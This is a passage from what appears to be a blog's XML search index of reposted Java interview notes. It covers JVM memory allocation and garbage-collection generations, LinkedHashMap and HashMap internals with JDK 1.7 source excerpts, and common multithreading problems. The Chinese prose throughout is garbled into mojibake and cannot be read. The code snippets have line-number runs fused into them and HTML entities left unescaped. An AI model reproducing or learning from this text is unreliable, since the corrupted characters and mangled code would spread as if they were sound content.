å†…å­˜åˆ†é…ä¹‹åéœ€è¦å¯¹è¯¥å¯¹è±¡è¿›è¡Œè®¾ç½®ï¼Œå¦‚å¯¹è±¡å¤´ã€‚å¯¹è±¡å¤´çš„ä¸€äº›åº”ç”¨å¯ä»¥æŸ¥çœ‹ Synchronize å…³é”®å­—åŸç†ã€‚ å¯¹è±¡è®¿é—®ä¸€ä¸ªå¯¹è±¡è¢«åˆ›å»ºä¹‹åè‡ªç„¶æ˜¯ä¸ºäº†ä½¿ç”¨ï¼Œåœ¨ Java ä¸­æ˜¯é€šè¿‡æ ˆæ¥å¼•ç”¨å †å†…å­˜ä¸­çš„å¯¹è±¡æ¥è¿›è¡Œæ“ä½œçš„ã€‚ å¯¹äºæˆ‘ä»¬å¸¸ç”¨çš„ HotSpot è™šæ‹Ÿæœºæ¥è¯´ï¼Œè¿™æ ·å¼•ç”¨å…³ç³»æ˜¯é€šè¿‡ç›´æ¥æŒ‡é’ˆæ¥å…³è”çš„ã€‚ å¦‚å›¾: è¿™æ ·çš„å¥½å¤„å°±æ˜¯ï¼šåœ¨ Java é‡Œè¿›è¡Œé¢‘ç¹çš„å¯¹è±¡è®¿é—®å¯ä»¥æå‡è®¿é—®é€Ÿåº¦(ç›¸å¯¹äºä½¿ç”¨å¥æŸ„æ± æ¥è¯´)ã€‚ å†…å­˜åˆ†é…Eden åŒºåˆ†é…ç®€å•çš„æ¥è¯´å¯¹è±¡éƒ½æ˜¯åœ¨å †å†…å­˜ä¸­åˆ†é…çš„ï¼Œå¾€ç»†ä¸€ç‚¹çœ‹åˆ™æ˜¯ä¼˜å…ˆåœ¨ Eden åŒºåˆ†é…ã€‚ è¿™é‡Œå°±æ¶‰åŠåˆ°å †å†…å­˜çš„åˆ’åˆ†äº†ï¼Œä¸ºäº†æ–¹ä¾¿åƒåœ¾å›æ”¶ï¼ŒJVM å°†å †å†…å­˜åˆ†ä¸ºæ–°ç”Ÿä»£å’Œè€å¹´ä»£ã€‚ è€Œæ–°ç”Ÿä»£ä¸­åˆä¼šåˆ’åˆ†ä¸º Eden åŒºï¼Œfrom Survivorã€to Survivor åŒºã€‚ å…¶ä¸­ Eden å’Œ Survivor åŒºçš„æ¯”ä¾‹é»˜è®¤æ˜¯ 8:1:1ï¼Œå½“ç„¶ä¹Ÿæ”¯æŒå‚æ•°è°ƒæ•´ -XX:SurvivorRatio=8ã€‚ å½“åœ¨ Eden åŒºåˆ†é…å†…å­˜ä¸è¶³æ—¶ï¼Œåˆ™ä¼šå‘ç”Ÿ minorGC ï¼Œç”±äº Java å¯¹è±¡å¤šæ•°æ˜¯æœç”Ÿå¤•ç­çš„ç‰¹æ€§ï¼Œæ‰€ä»¥ minorGC é€šå¸¸ä¼šæ¯”è¾ƒé¢‘ç¹ï¼Œæ•ˆç‡ä¹Ÿæ¯”è¾ƒé«˜ã€‚ å½“å‘ç”Ÿ minorGC æ—¶ï¼ŒJVM ä¼šæ ¹æ®å¤åˆ¶ç®—æ³•å°†å­˜æ´»çš„å¯¹è±¡æ‹·è´åˆ°å¦ä¸€ä¸ªæœªä½¿ç”¨çš„ Survivor åŒºï¼Œå¦‚æœ Survivor åŒºå†…å­˜ä¸è¶³æ—¶ï¼Œåˆ™ä¼šä½¿ç”¨åˆ†é…æ‹…ä¿ç­–ç•¥å°†å¯¹è±¡ç§»åŠ¨åˆ°è€å¹´ä»£ä¸­ã€‚ è°ˆåˆ° minorGC æ—¶ï¼Œå°±ä¸å¾—ä¸æåˆ° fullGC(majorGC) ï¼Œè¿™æ˜¯æŒ‡å‘ç”Ÿåœ¨è€å¹´ä»£çš„ GC ï¼Œä¸è®ºæ˜¯æ•ˆç‡è¿˜æ˜¯é€Ÿåº¦éƒ½æ¯” minorGC æ…¢çš„å¤šï¼Œå›æ”¶æ—¶è¿˜ä¼šå‘ç”Ÿ stop the world ä½¿ç¨‹åºå‘ç”Ÿåœé¡¿ï¼Œæ‰€ä»¥åº”å½“å°½é‡é¿å…å‘ç”Ÿ fullGC ã€‚ è€å¹´ä»£åˆ†é…ä¹Ÿæœ‰ä¸€äº›æƒ…å†µä¼šå¯¼è‡´å¯¹è±¡ç›´æ¥åœ¨è€å¹´ä»£åˆ†é…ï¼Œæ¯”å¦‚å½“åˆ†é…ä¸€ä¸ªå¤§å¯¹è±¡æ—¶(å¤§çš„æ•°ç»„ï¼Œå¾ˆé•¿çš„å­—ç¬¦ä¸²)ï¼Œç”±äº Eden åŒºæ²¡æœ‰è¶³å¤Ÿå¤§çš„è¿ç»­ç©ºé—´æ¥åˆ†é…æ—¶ï¼Œä¼šå¯¼è‡´æå‰è§¦å‘ä¸€æ¬¡ GCï¼Œæ‰€ä»¥å°½é‡åˆ«é¢‘ç¹çš„åˆ›å»ºå¤§å¯¹è±¡ã€‚ å› æ­¤ JVM ä¼šæ ¹æ®ä¸€ä¸ªé˜ˆå€¼æ¥åˆ¤æ–­å¤§äºè¯¥é˜ˆå€¼å¯¹è±¡ç›´æ¥åˆ†é…åˆ°è€å¹´ä»£ï¼Œè¿™æ ·å¯ä»¥é¿å…åœ¨æ–°ç”Ÿä»£é¢‘ç¹çš„å‘ç”Ÿ GCã€‚ å¯¹äºä¸€äº›åœ¨æ–°ç”Ÿä»£çš„è€å¯¹è±¡ JVM ä¹Ÿä¼šæ ¹æ®æŸç§æœºåˆ¶ç§»åŠ¨åˆ°è€å¹´ä»£ä¸­ã€‚ JVM æ˜¯æ ¹æ®è®°å½•å¯¹è±¡å¹´é¾„çš„æ–¹å¼æ¥åˆ¤æ–­è¯¥å¯¹è±¡æ˜¯å¦åº”è¯¥ç§»åŠ¨åˆ°è€å¹´ä»£ï¼Œæ ¹æ®æ–°ç”Ÿä»£çš„å¤åˆ¶ç®—æ³•ï¼Œå½“ä¸€ä¸ªå¯¹è±¡è¢«ç§»åŠ¨åˆ° Survivor åŒºä¹‹å JVM å°±ç»™è¯¥å¯¹è±¡çš„å¹´é¾„è®°ä¸º1ï¼Œæ¯å½“ç†¬è¿‡ä¸€æ¬¡ minorGC åå¯¹è±¡çš„å¹´é¾„å°± +1 ï¼Œç›´åˆ°è¾¾åˆ°é˜ˆå€¼(é»˜è®¤ä¸º15)å°±ç§»åŠ¨åˆ°è€å¹´ä»£ä¸­ã€‚ å¯ä»¥ä½¿ç”¨ -XX:MaxTenuringThreshold=15 æ¥é…ç½®è¿™ä¸ªé˜ˆå€¼ã€‚ æ€»ç»“è™½è¯´è¿™äº›å†…å®¹ç•¥æ˜¾æ¯ç‡¥ï¼Œä½†å½“åº”ç”¨å‘ç”Ÿä¸æ­£å¸¸çš„ GC æ—¶ï¼Œå¯ä»¥æ–¹ä¾¿æ›´å¿«çš„å®šä½é—®é¢˜ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[LinkedHashMap]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2Fcollection%2FLinkedHashMap%2F</url>
    <content type="text"><![CDATA[LinkedHashMap åº•å±‚åˆ†æä¼—æ‰€å‘¨çŸ¥ HashMap æ˜¯ä¸€ä¸ªæ— åºçš„ Mapï¼Œå› ä¸ºæ¯æ¬¡æ ¹æ® key çš„ hashcode æ˜ å°„åˆ° Entry æ•°ç»„ä¸Šï¼Œæ‰€ä»¥éå†å‡ºæ¥çš„é¡ºåºå¹¶ä¸æ˜¯å†™å…¥çš„é¡ºåºã€‚ å› æ­¤ JDK æ¨å‡ºä¸€ä¸ªåŸºäº HashMap ä½†å…·æœ‰é¡ºåºçš„ LinkedHashMap æ¥è§£å†³æœ‰æ’åºéœ€æ±‚çš„åœºæ™¯ã€‚ å®ƒçš„åº•å±‚æ˜¯ç»§æ‰¿äº HashMap å®ç°çš„ï¼Œç”±ä¸€ä¸ªåŒå‘é“¾è¡¨æ‰€æ„æˆã€‚ LinkedHashMap çš„æ’åºæ–¹å¼æœ‰ä¸¤ç§ï¼š æ ¹æ®å†™å…¥é¡ºåºæ’åºã€‚ æ ¹æ®è®¿é—®é¡ºåºæ’åºã€‚ å…¶ä¸­æ ¹æ®è®¿é—®é¡ºåºæ’åºæ—¶ï¼Œæ¯æ¬¡ get éƒ½ä¼šå°†è®¿é—®çš„å€¼ç§»åŠ¨åˆ°é“¾è¡¨æœ«å°¾ï¼Œè¿™æ ·é‡å¤æ“ä½œå°±èƒ½å¾—åˆ°ä¸€ä¸ªæŒ‰ç…§è®¿é—®é¡ºåºæ’åºçš„é“¾è¡¨ã€‚ æ•°æ®ç»“æ„1234567891011@Testpublic void test()&#123; Map&lt;String, Integer&gt; map = new LinkedHashMap&lt;String, Integer&gt;(); map.put("1",1) ; map.put("2",2) ; map.put("3",3) ; map.put("4",4) ; map.put("5",5) ; System.out.println(map.toString());&#125; è°ƒè¯•å¯ä»¥çœ‹åˆ° map çš„ç»„æˆï¼š æ‰“å¼€æºç å¯ä»¥çœ‹åˆ°ï¼š 123456789101112131415161718192021/** * The head of the doubly linked list. */private transient Entry&lt;K,V&gt; header;/** * The iteration ordering method for this linked hash map: &lt;tt&gt;true&lt;/tt&gt; * for access-order, &lt;tt&gt;false&lt;/tt&gt; for insertion-order. * * @serial */private final boolean accessOrder;private static class Entry&lt;K,V&gt; extends HashMap.Entry&lt;K,V&gt; &#123; // These fields comprise the doubly linked list used for iteration. Entry&lt;K,V&gt; before, after; Entry(int hash, K key, V value, HashMap.Entry&lt;K,V&gt; next) &#123; super(hash, key, value, next); &#125;&#125; å…¶ä¸­ Entry ç»§æ‰¿äº HashMap çš„ Entryï¼Œå¹¶æ–°å¢äº†ä¸Šä¸‹èŠ‚ç‚¹çš„æŒ‡é’ˆï¼Œä¹Ÿå°±å½¢æˆäº†åŒå‘é“¾è¡¨ã€‚ è¿˜æœ‰ä¸€ä¸ª header çš„æˆå‘˜å˜é‡ï¼Œæ˜¯è¿™ä¸ªåŒå‘é“¾è¡¨çš„å¤´ç»“ç‚¹ã€‚ ä¸Šè¾¹çš„ demo æ€»ç»“æˆä¸€å¼ å›¾å¦‚ä¸‹ï¼š ç¬¬ä¸€ä¸ªç±»ä¼¼äº HashMap çš„ç»“æ„ï¼Œåˆ©ç”¨ Entry ä¸­çš„ next æŒ‡é’ˆè¿›è¡Œå…³è”ã€‚ ä¸‹è¾¹åˆ™æ˜¯ LinkedHashMap å¦‚ä½•è¾¾åˆ°æœ‰åºçš„å…³é”®ã€‚ å°±æ˜¯åˆ©ç”¨äº†å¤´èŠ‚ç‚¹å’Œå…¶ä½™çš„å„ä¸ªèŠ‚ç‚¹ä¹‹é—´é€šè¿‡ Entry ä¸­çš„ after å’Œ before æŒ‡é’ˆè¿›è¡Œå…³è”ã€‚ å…¶ä¸­è¿˜æœ‰ä¸€ä¸ª accessOrder æˆå‘˜å˜é‡ï¼Œé»˜è®¤æ˜¯ falseï¼Œé»˜è®¤æŒ‰ç…§æ’å…¥é¡ºåºæ’åºï¼Œä¸º true æ—¶æŒ‰ç…§è®¿é—®é¡ºåºæ’åºï¼Œä¹Ÿå¯ä»¥è°ƒç”¨: 123456public LinkedHashMap(int initialCapacity, float loadFactor, boolean accessOrder) &#123; super(initialCapacity, loadFactor); this.accessOrder = accessOrder;&#125; è¿™ä¸ªæ„é€ æ–¹æ³•å¯ä»¥æ˜¾ç¤ºçš„ä¼ å…¥ accessOrderã€‚ æ„é€ æ–¹æ³•LinkedHashMap çš„æ„é€ æ–¹æ³•: 1234public LinkedHashMap() &#123; super(); accessOrder = false;&#125; å…¶å®å°±æ˜¯è°ƒç”¨çš„ HashMap çš„æ„é€ æ–¹æ³•: HashMap å®ç°ï¼š 123456789101112131415public HashMap(int initialCapacity, float loadFactor) &#123; if (initialCapacity &lt; 0) throw new IllegalArgumentException("Illegal initial capacity: " + initialCapacity); if (initialCapacity &gt; MAXIMUM_CAPACITY) initialCapacity = MAXIMUM_CAPACITY; if (loadFactor &lt;= 0 || Float.isNaN(loadFactor)) throw new IllegalArgumentException("Illegal load factor: " + loadFactor); this.loadFactor = loadFactor; threshold = initialCapacity; //HashMap åªæ˜¯å®šä¹‰äº†æ”¹æ–¹æ³•ï¼Œå…·ä½“å®ç°äº¤ç»™äº† LinkedHashMap init();&#125; å¯ä»¥çœ‹åˆ°é‡Œé¢æœ‰ä¸€ä¸ªç©ºçš„ init()ï¼Œå…·ä½“æ˜¯ç”± LinkedHashMap æ¥å®ç°çš„ï¼š 12345@Overridevoid init() &#123; header = new Entry&lt;&gt;(-1, null, null, null); header.before = header.after = header;&#125; å…¶å®ä¹Ÿå°±æ˜¯å¯¹ header è¿›è¡Œäº†åˆå§‹åŒ–ã€‚ put() æ–¹æ³•çœ‹ LinkedHashMap çš„ put() æ–¹æ³•ä¹‹å‰å…ˆçœ‹çœ‹ HashMap çš„ put æ–¹æ³•ï¼š 123456789101112131415161718192021222324252627282930313233343536373839404142public V put(K key, V value) &#123; if (table == EMPTY_TABLE) &#123; inflateTable(threshold); &#125; if (key == null) return putForNullKey(value); int hash = hash(key); int i = indexFor(hash, table.length); for (Entry&lt;K,V&gt; e = table[i]; e != null; e = e.next) &#123; Object k; if (e.hash == hash &amp;&amp; ((k = e.key) == key || key.equals(k))) &#123; V oldValue = e.value; e.value = value; //ç©ºå®ç°ï¼Œäº¤ç»™ LinkedHashMap è‡ªå·±å®ç° e.recordAccess(this); return oldValue; &#125; &#125; modCount++; // LinkedHashMap å¯¹å…¶é‡å†™ addEntry(hash, key, value, i); return null;&#125;// LinkedHashMap å¯¹å…¶é‡å†™void addEntry(int hash, K key, V value, int bucketIndex) &#123; if ((size &gt;= threshold) &amp;&amp; (null != table[bucketIndex])) &#123; resize(2 * table.length); hash = (null != key) ? hash(key) : 0; bucketIndex = indexFor(hash, table.length); &#125; createEntry(hash, key, value, bucketIndex);&#125;// LinkedHashMap å¯¹å…¶é‡å†™void createEntry(int hash, K key, V value, int bucketIndex) &#123; Entry&lt;K,V&gt; e = table[bucketIndex]; table[bucketIndex] = new Entry&lt;&gt;(hash, key, value, e); size++;&#125; ä¸»ä½“çš„å®ç°éƒ½æ˜¯å€ŸåŠ©äº HashMap æ¥å®Œæˆçš„ï¼Œåªæ˜¯å¯¹å…¶ä¸­çš„ recordAccess(), addEntry(), createEntry() è¿›è¡Œäº†é‡å†™ã€‚ LinkedHashMap çš„å®ç°ï¼š 1234567891011121314151617181920212223242526272829303132333435363738 //å°±æ˜¯åˆ¤æ–­æ˜¯å¦æ˜¯æ ¹æ®è®¿é—®é¡ºåºæ’åºï¼Œå¦‚æœæ˜¯åˆ™éœ€è¦å°†å½“å‰è¿™ä¸ª Entry ç§»åŠ¨åˆ°é“¾è¡¨çš„æœ«å°¾ void recordAccess(HashMap&lt;K,V&gt; m) &#123; LinkedHashMap&lt;K,V&gt; lm = (LinkedHashMap&lt;K,V&gt;)m; if (lm.accessOrder) &#123; lm.modCount++; remove(); addBefore(lm.header); &#125; &#125; //è°ƒç”¨äº† HashMap çš„å®ç°ï¼Œå¹¶åˆ¤æ–­æ˜¯å¦éœ€è¦åˆ é™¤æœ€å°‘ä½¿ç”¨çš„ Entry(é»˜è®¤ä¸åˆ é™¤) void addEntry(int hash, K key, V value, int bucketIndex) &#123; super.addEntry(hash, key, value, bucketIndex); // Remove eldest entry if instructed Entry&lt;K,V&gt; eldest = header.after; if (removeEldestEntry(eldest)) &#123; removeEntryForKey(eldest.key); &#125;&#125;void createEntry(int hash, K key, V value, int bucketIndex) &#123; HashMap.Entry&lt;K,V&gt; old = table[bucketIndex]; Entry&lt;K,V&gt; e = new Entry&lt;&gt;(hash, key, value, old); //å°±å¤šäº†è¿™ä¸€æ­¥ï¼Œå°†æ–°å¢çš„ Entry åŠ å…¥åˆ° header åŒå‘é“¾è¡¨ä¸­ table[bucketIndex] = e; e.addBefore(header); size++;&#125; //å†™å…¥åˆ°åŒå‘é“¾è¡¨ä¸­ private void addBefore(Entry&lt;K,V&gt; existingEntry) &#123; after = existingEntry; before = existingEntry.before; before.after = this; after.before = this; &#125; get æ–¹æ³•LinkedHashMap çš„ get() æ–¹æ³•ä¹Ÿé‡å†™äº†ï¼š 123456789101112131415161718192021public V get(Object key) &#123; Entry&lt;K,V&gt; e = (Entry&lt;K,V&gt;)getEntry(key); if (e == null) return null; //å¤šäº†ä¸€ä¸ªåˆ¤æ–­æ˜¯å¦æ˜¯æŒ‰ç…§è®¿é—®é¡ºåºæ’åºï¼Œæ˜¯åˆ™å°†å½“å‰çš„ Entry ç§»åŠ¨åˆ°é“¾è¡¨å¤´éƒ¨ã€‚ e.recordAccess(this); return e.value;&#125;void recordAccess(HashMap&lt;K,V&gt; m) &#123; LinkedHashMap&lt;K,V&gt; lm = (LinkedHashMap&lt;K,V&gt;)m; if (lm.accessOrder) &#123; lm.modCount++; //åˆ é™¤ remove(); //æ·»åŠ åˆ°å¤´éƒ¨ addBefore(lm.header); &#125;&#125; clear() æ¸…ç©ºå°±è¦æ¯”è¾ƒç®€å•äº†ï¼š 12345//åªéœ€è¦æŠŠæŒ‡é’ˆéƒ½æŒ‡å‘è‡ªå·±å³å¯ï¼ŒåŸæœ¬é‚£äº› Entry æ²¡æœ‰å¼•ç”¨ä¹‹åå°±ä¼šè¢« JVM è‡ªåŠ¨å›æ”¶ã€‚public void clear() &#123; super.clear(); header.before = header.after = header;&#125; æ€»ç»“æ€»çš„æ¥è¯´ LinkedHashMap å…¶å®å°±æ˜¯å¯¹ HashMap è¿›è¡Œäº†æ‹“å±•ï¼Œä½¿ç”¨äº†åŒå‘é“¾è¡¨æ¥ä¿è¯äº†é¡ºåºæ€§ã€‚ å› ä¸ºæ˜¯ç»§æ‰¿ä¸ HashMap çš„ï¼Œæ‰€ä»¥ä¸€äº› HashMap å­˜åœ¨çš„é—®é¢˜ LinkedHashMap ä¹Ÿä¼šå­˜åœ¨ï¼Œæ¯”å¦‚ä¸æ”¯æŒå¹¶å‘ç­‰ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[Thread-common-problem]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FThread-common-problem%2F</url>
    <content type="text"><![CDATA[Java å¤šçº¿ç¨‹å¸¸è§é—®é¢˜ä¸Šä¸‹æ–‡åˆ‡æ¢å¤šçº¿ç¨‹å¹¶ä¸ä¸€å®šæ˜¯è¦åœ¨å¤šæ ¸å¤„ç†å™¨æ‰æ”¯æŒçš„ï¼Œå°±ç®—æ˜¯å•æ ¸ä¹Ÿæ˜¯å¯ä»¥æ”¯æŒå¤šçº¿ç¨‹çš„ã€‚CPU é€šè¿‡ç»™æ¯ä¸ªçº¿ç¨‹åˆ†é…ä¸€å®šçš„æ—¶é—´ç‰‡ï¼Œç”±äºæ—¶é—´éå¸¸çŸ­é€šå¸¸æ˜¯å‡ åæ¯«ç§’ï¼Œæ‰€ä»¥ CPU å¯ä»¥ä¸åœçš„åˆ‡æ¢çº¿ç¨‹æ‰§è¡Œä»»åŠ¡ä»è€Œè¾¾åˆ°äº†å¤šçº¿ç¨‹çš„æ•ˆæœã€‚ ä½†æ˜¯ç”±äºåœ¨çº¿ç¨‹åˆ‡æ¢çš„æ—¶å€™éœ€è¦ä¿å­˜æœ¬æ¬¡æ‰§è¡Œçš„ä¿¡æ¯(è¯¦è§)ï¼Œåœ¨è¯¥çº¿ç¨‹è¢« CPU å‰¥å¤ºæ—¶é—´ç‰‡ååˆå†æ¬¡è¿è¡Œæ¢å¤ä¸Šæ¬¡æ‰€ä¿å­˜çš„ä¿¡æ¯çš„è¿‡ç¨‹å°±æˆä¸ºä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ ä¸Šä¸‹æ–‡åˆ‡æ¢æ˜¯éå¸¸è€—æ•ˆç‡çš„ã€‚ é€šå¸¸æœ‰ä»¥ä¸‹è§£å†³æ–¹æ¡ˆ: é‡‡ç”¨æ— é”ç¼–ç¨‹ï¼Œæ¯”å¦‚å°†æ•°æ®æŒ‰ç…§ Hash(id) è¿›è¡Œå–æ¨¡åˆ†æ®µï¼Œæ¯ä¸ªçº¿ç¨‹å¤„ç†å„è‡ªåˆ†æ®µçš„æ•°æ®ï¼Œä»è€Œé¿å…ä½¿ç”¨é”ã€‚ é‡‡ç”¨ CAS(compare and swap) ç®—æ³•ï¼Œå¦‚ Atomic åŒ…å°±æ˜¯é‡‡ç”¨ CAS ç®—æ³•(è¯¦è§)ã€‚ åˆç†çš„åˆ›å»ºçº¿ç¨‹ï¼Œé¿å…åˆ›å»ºäº†ä¸€äº›çº¿ç¨‹ä½†å…¶ä¸­å¤§éƒ¨åˆ†éƒ½æ˜¯å‡ºäº waiting çŠ¶æ€ï¼Œå› ä¸ºæ¯å½“ä» waiting çŠ¶æ€åˆ‡æ¢åˆ° running çŠ¶æ€éƒ½æ˜¯ä¸€æ¬¡ä¸Šä¸‹æ–‡åˆ‡æ¢ã€‚ æ­»é”æ­»é”çš„åœºæ™¯ä¸€èˆ¬æ˜¯ï¼šçº¿ç¨‹ A å’Œçº¿ç¨‹ B éƒ½åœ¨äº’ç›¸ç­‰å¾…å¯¹æ–¹é‡Šæ”¾é”ï¼Œæˆ–è€…æ˜¯å…¶ä¸­æŸä¸ªçº¿ç¨‹åœ¨é‡Šæ”¾é”çš„æ—¶å€™å‡ºç°å¼‚å¸¸å¦‚æ­»å¾ªç¯ä¹‹ç±»çš„ã€‚è¿™æ—¶å°±ä¼šå¯¼è‡´ç³»ç»Ÿä¸å¯ç”¨ã€‚ å¸¸ç”¨çš„è§£å†³æ–¹æ¡ˆå¦‚ä¸‹ï¼š å°½é‡ä¸€ä¸ªçº¿ç¨‹åªè·å–ä¸€ä¸ªé”ã€‚ ä¸€ä¸ªçº¿ç¨‹åªå ç”¨ä¸€ä¸ªèµ„æºã€‚ å°è¯•ä½¿ç”¨å®šæ—¶é”ï¼Œè‡³å°‘èƒ½ä¿è¯é”æœ€ç»ˆä¼šè¢«é‡Šæ”¾ã€‚ èµ„æºé™åˆ¶å½“åœ¨å¸¦å®½æœ‰é™çš„æƒ…å†µä¸‹ä¸€ä¸ªçº¿ç¨‹ä¸‹è½½æŸä¸ªèµ„æºéœ€è¦ 1M/S,å½“å¼€ 10 ä¸ªçº¿ç¨‹æ—¶é€Ÿåº¦å¹¶ä¸ä¼šä¹˜ 10 å€ï¼Œåè€Œè¿˜ä¼šå¢åŠ æ—¶é—´ï¼Œæ¯•ç«Ÿä¸Šä¸‹æ–‡åˆ‡æ¢æ¯”è¾ƒè€—æ—¶ã€‚ å¦‚æœæ˜¯å—é™äºèµ„æºçš„è¯å¯ä»¥é‡‡ç”¨é›†ç¾¤æ¥å¤„ç†ä»»åŠ¡ï¼Œä¸åŒçš„æœºå™¨æ¥å¤„ç†ä¸åŒçš„æ•°æ®ï¼Œå°±ç±»ä¼¼äºå¼€å§‹æåˆ°çš„æ— é”ç¼–ç¨‹ã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[HashMap]]></title>
    <url>%2F2018%2F07%2F09%2FJava%2FInterview%2FJava-Interview%2FHashMap%2F</url>
    <content type="text"><![CDATA[HashMap åº•å±‚åˆ†æ ä»¥ä¸‹åŸºäº JDK1.7 åˆ†æã€‚ å¦‚å›¾æ‰€ç¤ºï¼ŒHashMap åº•å±‚æ˜¯åŸºäºæ•°ç»„å’Œé“¾è¡¨å®ç°çš„ã€‚å…¶ä¸­æœ‰ä¸¤ä¸ªé‡è¦çš„å‚æ•°ï¼š å®¹é‡ è´Ÿè½½å› å­ å®¹é‡çš„é»˜è®¤å¤§å°æ˜¯ 16ï¼Œè´Ÿè½½å› å­æ˜¯ 0.75ï¼Œå½“ HashMap çš„ size &gt; 16*0.75 æ—¶å°±ä¼šå‘ç”Ÿæ‰©å®¹(å®¹é‡å’Œè´Ÿè½½å› å­éƒ½å¯ä»¥è‡ªç”±è°ƒæ•´)ã€‚ put æ–¹æ³•é¦–å…ˆä¼šå°†ä¼ å…¥çš„ Key åš hash è¿ç®—è®¡ç®—å‡º hashcode,ç„¶åæ ¹æ®æ•°ç»„é•¿åº¦å–æ¨¡è®¡ç®—å‡ºåœ¨æ•°ç»„ä¸­çš„ index ä¸‹æ ‡ã€‚ ç”±äºåœ¨è®¡ç®—ä¸­ä½è¿ç®—æ¯”å–æ¨¡è¿ç®—æ•ˆç‡é«˜çš„å¤šï¼Œæ‰€ä»¥ HashMap è§„å®šæ•°ç»„çš„é•¿åº¦ä¸º 2&lt;sup&gt;n ã€‚è¿™æ ·ç”¨ 2&lt;/sup&gt;n - 1 åšä½è¿ç®—ä¸å–æ¨¡æ•ˆæœä¸€è‡´ï¼Œå¹¶ä¸”æ•ˆç‡è¿˜è¦é«˜å‡ºè®¸å¤šã€‚ ç”±äºæ•°ç»„çš„é•¿åº¦æœ‰é™ï¼Œæ‰€ä»¥éš¾å…ä¼šå‡ºç°ä¸åŒçš„ Key é€šè¿‡è¿ç®—å¾—åˆ°çš„ index ç›¸åŒï¼Œè¿™ç§æƒ…å†µå¯ä»¥åˆ©ç”¨é“¾è¡¨æ¥è§£å†³ï¼ŒHashMap ä¼šåœ¨ table[index]å¤„å½¢æˆé“¾è¡¨ï¼Œé‡‡ç”¨å¤´æ’æ³•å°†æ•°æ®æ’å…¥åˆ°é“¾è¡¨ä¸­ã€‚ get æ–¹æ³•get å’Œ put ç±»ä¼¼ï¼Œä¹Ÿæ˜¯å°†ä¼ å…¥çš„ Key è®¡ç®—å‡º index ï¼Œå¦‚æœè¯¥ä½ç½®ä¸Šæ˜¯ä¸€ä¸ªé“¾è¡¨å°±éœ€è¦éå†æ•´ä¸ªé“¾è¡¨ï¼Œé€šè¿‡ key.equals(k) æ¥æ‰¾åˆ°å¯¹åº”çš„å…ƒç´ ã€‚ éå†æ–¹å¼12345Iterator&lt;Map.Entry&lt;String, Integer&gt;&gt; entryIterator = map.entrySet().iterator(); while (entryIterator.hasNext()) &#123; Map.Entry&lt;String, Integer&gt; next = entryIterator.next(); System.out.println("key=" + next.getKey() + " value=" + next.getValue()); &#125; 123456Iterator&lt;String&gt; iterator = map.keySet().iterator(); while (iterator.hasNext())&#123; String key = iterator.next(); System.out.println("key=" + key + " value=" + map.get(key)); &#125; 123map.forEach((key,value)-&gt;&#123; System.out.println("key=" + key + " value=" + value);&#125;); å¼ºçƒˆå»ºè®®ä½¿ç”¨ç¬¬ä¸€ç§ EntrySet è¿›è¡Œéå†ã€‚ ç¬¬ä¸€ç§å¯ä»¥æŠŠ key value åŒæ—¶å–å‡ºï¼Œç¬¬äºŒç§è¿˜å¾—éœ€è¦é€šè¿‡ key å–ä¸€æ¬¡ valueï¼Œæ•ˆç‡è¾ƒä½, ç¬¬ä¸‰ç§éœ€è¦ JDK1.8 ä»¥ä¸Šï¼Œé€šè¿‡å¤–å±‚éå† tableï¼Œå†…å±‚éå†é“¾è¡¨æˆ–çº¢é»‘æ ‘ã€‚ noticeåœ¨å¹¶å‘ç¯å¢ƒä¸‹ä½¿ç”¨ HashMap å®¹æ˜“å‡ºç°æ­»å¾ªç¯ã€‚ å¹¶å‘åœºæ™¯å‘ç”Ÿæ‰©å®¹ï¼Œè°ƒç”¨ resize() æ–¹æ³•é‡Œçš„ rehash() æ—¶ï¼Œå®¹æ˜“å‡ºç°ç¯å½¢é“¾è¡¨ã€‚è¿™æ ·å½“è·å–ä¸€ä¸ªä¸å­˜åœ¨çš„ key æ—¶ï¼Œè®¡ç®—å‡ºçš„ index æ­£å¥½æ˜¯ç¯å½¢é“¾è¡¨çš„ä¸‹æ ‡æ—¶å°±ä¼šå‡ºç°æ­»å¾ªç¯ã€‚ æ‰€ä»¥ HashMap åªèƒ½åœ¨å•çº¿ç¨‹ä¸­ä½¿ç”¨ï¼Œå¹¶ä¸”å°½é‡çš„é¢„è®¾å®¹é‡ï¼Œå°½å¯èƒ½çš„å‡å°‘æ‰©å®¹ã€‚ åœ¨ JDK1.8 ä¸­å¯¹ HashMap è¿›è¡Œäº†ä¼˜åŒ–ï¼šå½“ hash ç¢°æ’ä¹‹åå†™å…¥é“¾è¡¨çš„é•¿åº¦è¶…è¿‡äº†é˜ˆå€¼(é»˜è®¤ä¸º8)ï¼Œé“¾è¡¨å°†ä¼šè½¬æ¢ä¸ºçº¢é»‘æ ‘ã€‚ å‡è®¾ hash å†²çªéå¸¸ä¸¥é‡ï¼Œä¸€ä¸ªæ•°ç»„åé¢æ¥äº†å¾ˆé•¿çš„é“¾è¡¨ï¼Œæ­¤æ—¶é‡æ–°çš„æ—¶é—´å¤æ‚åº¦å°±æ˜¯ O(n) ã€‚ å¦‚æœæ˜¯çº¢é»‘æ ‘ï¼Œæ—¶é—´å¤æ‚åº¦å°±æ˜¯ O(logn) ã€‚ å¤§å¤§æé«˜äº†æŸ¥è¯¢æ•ˆç‡ã€‚ å¤šçº¿ç¨‹åœºæ™¯ä¸‹æ¨èä½¿ç”¨ ConcurrentHashMapã€‚]]></content>
      <categories>
        <category>Github</category>
        <category>Java-Interview</category>
      </categories>
      <tags>
        <tag>æŠ€æœ¯</tag>
        <tag>Java</tag>
        <tag>è½¬è½½</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[ConcurrentHashMap]]></title>
